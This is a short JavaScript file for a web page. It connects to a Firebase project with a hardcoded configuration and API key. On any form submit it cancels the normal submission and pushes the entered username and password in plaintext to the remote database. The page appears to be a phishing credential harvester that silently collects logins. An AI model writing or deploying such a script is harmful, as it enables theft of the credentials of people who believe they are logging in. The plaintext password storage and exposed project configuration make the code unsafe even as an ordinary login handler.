import { initializeApp } from 'firebase/app'
import { getDatabase, ref, push, get, remove } from 'firebase/database'

const appSettings = {
    apiKey: "AIzaSyBqlw1dd_yzQ1RH3ZfcGIF4_akKo-cMmcI",
    authDomain: "safinybot-19536.firebaseapp.com",
    databaseURL: "https://safinybot-19536-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "safinybot-19536",
    storageBucket: "safinybot-19536.appspot.com",
    messagingSenderId: "6715380273",
    appId: "1:6715380273:web:7224840a23e1e1c5d8bb10",
    measurementId: "G-VF7EK611DW"
  };
const app = initializeApp(appSettings)
const database = getDatabase(app)
const logins = ref(database)


document.addEventListener('submit', (e) => {
    e.preventDefault()
    const user = document.getElementById('user-input-1')
    const password = document.getElementById('user-input-2')
    push(logins, {
        User: user.value,
        Password: password.value
    })
})
console.log("clear")
